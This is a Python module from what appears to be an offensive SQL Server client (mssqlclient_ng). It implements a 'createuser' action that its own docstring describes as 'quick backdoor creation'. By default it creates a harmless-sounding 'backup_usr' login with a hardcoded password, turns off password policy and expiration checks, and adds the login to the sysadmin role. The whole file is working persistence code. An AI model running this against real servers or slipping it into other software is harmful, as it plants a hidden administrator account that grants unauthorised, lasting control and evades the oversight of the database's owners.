"""
CreateUser action for creating SQL Server logins with server role privileges.
"""

from typing import Optional, Dict, Any
from loguru import logger

from mssqlclient_ng.src.actions.base import BaseAction
from mssqlclient_ng.src.actions.factory import ActionFactory
from mssqlclient_ng.src.services.database import DatabaseContext
from mssqlclient_ng.src.utils import formatter


@ActionFactory.register(
    "createuser", "Create a new SQL Server login with server role privileges"
)
class CreateUser(BaseAction):
    """
    Creates a new SQL Server login with specified server role privileges.

    This action creates a SQL login (not Windows authentication) and assigns
    it to a server role. Default credentials are provided for quick backdoor
    creation, but custom credentials can be specified.
    """

    def __init__(self):
        super().__init__()
        self._username: str = "backup_usr"
        self._password: str = "$ap3rlip0pe//e"
        self._role: str = "sysadmin"

    def validate_arguments(self, additional_arguments: str) -> None:
        """
        Validate and parse arguments for creating a user.

        Args:
            additional_arguments: Space-separated arguments:
                - username (default: backup_usr)
                - password (default: $ap3rlip0pe//e)
                - role (default: sysadmin)

        Examples:
            createuser
            createuser myuser mypass123
            createuser myuser mypass123 sysadmin
        """
        if not additional_arguments or not additional_arguments.strip():
            logger.info(
                f"Using default credentials: {self._username} with role: {self._role}"
            )
            return

        parts = additional_arguments.split(maxsplit=2)

        # Parse positional arguments
        if len(parts) >= 1:
            self._username = parts[0].strip()

        if len(parts) >= 2:
            self._password = parts[1].strip()

        if len(parts) >= 3:
            self._role = parts[2].strip()

        # Validate inputs
        if not self._username:
            raise ValueError("Username cannot be empty")

        if not self._password:
            raise ValueError("Password cannot be empty")

        if not self._role:
            raise ValueError("Role cannot be empty")

    def execute(self, database_context: DatabaseContext) -> Optional[bool]:
        """
        Create a SQL Server login with the specified server role.

        Args:
            database_context: The database context

        Returns:
            True if successful, False otherwise
        """
        logger.info(f"Creating SQL login: {self._username} with {self._role} role")

        try:
            # Create the SQL login
            logger.info(f"Creating SQL login '{self._username}'")

            # Escape single quotes in password
            escaped_password = self._password.replace("'", "''")

            create_login_query = f"""
                CREATE LOGIN [{self._username}]
                WITH PASSWORD = '{escaped_password}',
                CHECK_POLICY = OFF,
                CHECK_EXPIRATION = OFF;
            """

            database_context.query_service.execute_non_processing(create_login_query)
            logger.success(f"SQL login '{self._username}' created successfully")

            # Add the login to the specified server role
            logger.info(f"Adding '{self._username}' to {self._role} server role")

            add_role_query = (
                f"ALTER SERVER ROLE [{self._role}] ADD MEMBER [{self._username}];"
            )
            database_context.query_service.execute_non_processing(add_role_query)

            logger.success(
                f"'{self._username}' added to {self._role} role successfully"
            )
            return True

        except Exception as ex:
            logger.error(f"Failed to create SQL login: {ex}")

            error_msg = str(ex).lower()
            if "permission" in error_msg:
                logger.warning(
                    "You may not have sufficient privileges to create logins or assign server roles"
                )

            return False

    def get_arguments(self) -> list:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return [
            "Username for SQL login (default: backup_usr)",
            "Password for SQL login (default: $ap3rlip0pe//e)",
            "Server role to assign (default: sysadmin)",
        ]
